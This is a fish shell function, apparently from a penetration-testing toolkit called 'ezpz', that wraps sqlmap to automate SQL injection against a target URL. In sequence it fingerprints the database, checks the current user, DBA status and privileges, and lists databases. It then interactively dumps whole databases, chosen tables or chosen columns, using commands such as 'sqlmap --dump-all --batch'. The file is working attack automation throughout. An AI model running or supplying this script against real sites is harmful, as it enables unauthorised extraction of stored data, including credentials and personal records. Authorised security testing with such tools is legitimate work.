function _ezpz_enumsqli
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # ASCII art banner
    echo ''
    echo '                         '(set_color magenta --bold)'    __|   _ \   |    '(set_color normal)
    echo '   -_)    \   |  |   ` \ '(set_color magenta --bold)'  \__ \  (   |  |    '(set_color normal)
    echo ' \___| _| _| \_,_| _|_|_|'(set_color magenta --bold)'  ____/ \__\_\ ____| '(set_color normal)
    echo ''

    # Usage message
    set usage "
Usage: ezpz enumsqli [sqlmap_options]
  A wrapper for sqlmap to automate enumeration and dumping.
  Pass any valid sqlmap options for targeting (e.g., -u 'http://...').

Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
"

    # Check if sqlmap is installed
    if not command -v sqlmap >/dev/null
        ezpz_error "sqlmap not found. Please install it first."
        return 1
    end

    # If no arguments provided, show usage
    if test (count $argv) -eq 0
        ezpz_error "Missing sqlmap parameters."
        echo $usage
        return 1
    end

    # Start DBMS enumeration
    ezpz_title "Starting DBMS enumeration..."

    # Banner
    ezpz_header "Fetching database banner"
    ezpz_cmd "sqlmap $argv --banner --batch"
    sqlmap $argv --banner --batch 2>/dev/null | grep -E --color=never "technology:|DBMS:|banner:|system:" | grep -v '^$'

    # Current user and DBA status
    ezpz_header "Fetching current user and DBA status"
    ezpz_cmd "sqlmap $argv --current-user --is-dba --batch"
    sqlmap $argv --current-user --is-dba --batch 2>/dev/null | grep -oP --color=never "(?<=current user: ').*(?=')|(?<=DBA: ).*" | grep -v '^$'

    # User privileges
    ezpz_header "Fetching user privileges"
    ezpz_cmd "sqlmap $argv --privileges --batch"
    sqlmap $argv --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'

    # Start data enumeration
    ezpz_title "Starting data enumeration..."
    ezpz_header "Fetching all databases"
    ezpz_cmd "sqlmap $argv --dbs --batch"
    sqlmap $argv --dbs --batch 2>/dev/null | \
        tail -n +10 | \
        grep -vE '^[[:space:]]*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]' | \
        sed 's/^\[\*\] //' | grep --color=never -E '^[a-zA-Z0-9_]+$'

    # Get current database
    set current_db (sqlmap $argv --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')")
    
    # Ask user which database to enumerate
    ezpz_question "Select database (all/current/name) [current]: "
    read -l db_choice
    or set db_choice "current" # Default to current if timeout
    set db_choice (string trim $db_choice)

    switch $db_choice
        case "" "current"
            if test -z "$current_db"
                ezpz_error "Could not determine current database."
                return 1
            end
            set db $current_db
        case "all"
            ezpz_header "Dumping all databases"
            ezpz_cmd "sqlmap $argv --dump-all --batch"
            sqlmap $argv --dump-all --batch
            return 0
        case '*'
            set db $db_choice
    end

    # Fetch tables for selected database
    ezpz_header "Fetching tables for database '$db'"
    ezpz_cmd "sqlmap $argv -D \"$db\" --tables --batch"
    sqlmap $argv -D "$db" --tables --batch 2>/dev/null | \
        #tail -n +10 | \
        grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | \
        sed 's/[[:space:]]*$//'

    if not test $status -eq 0
        ezpz_error "No tables found in database '$db'."
        return 1
    end

    # Ask user which tables to enumerate
    ezpz_question "Select tables (all/names): [all] "
    read -l table_choice
    or set table_choice "all" # Default to all if timeout
    set table_choice (string trim $table_choice)

    switch $table_choice
        case "" "all"
            ezpz_header "Dumping all tables"
            ezpz_cmd "sqlmap $argv -D \"$db\" --dump --batch"
            sqlmap $argv -D "$db" --dump --batch | \
                tail -n +10 | \
                grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
            return 0
        case '*'
            for table in (string split "," $table_choice)
                set table (string trim $table)
                ezpz_title "Accessing table \"$table\"..."
                ezpz_header "Retrieving columns for table '$table'"
                ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --columns --batch"
                sqlmap $argv -D "$db" -T "$table" --columns --batch 2>/dev/null | \
                    tail -n +10 | \
                    grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'

                ezpz_question "Select columns (all/names): [all] "
                read -l column_choice
                or set column_choice "all" # Default to all if timeout
                set column_choice (string trim $column_choice)

                switch $column_choice
                    case "" "all"
                        ezpz_header "Dumping all columns from table '$table'"
                        ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --dump --batch"
                        sqlmap $argv -D "$db" -T "$table" --dump --batch | \
                            tail -n +10 | \
                            grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                    case '*'
                        ezpz_header "Dumping selected columns from table '$table'"
                        ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" -C \"$column_choice\" --dump --batch"
                        sqlmap $argv -D "$db" -T "$table" -C "$column_choice" --dump --batch | \
                            tail -n +10 | \
                            grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                end
            end
    end

    ezpz_success "Done."
end 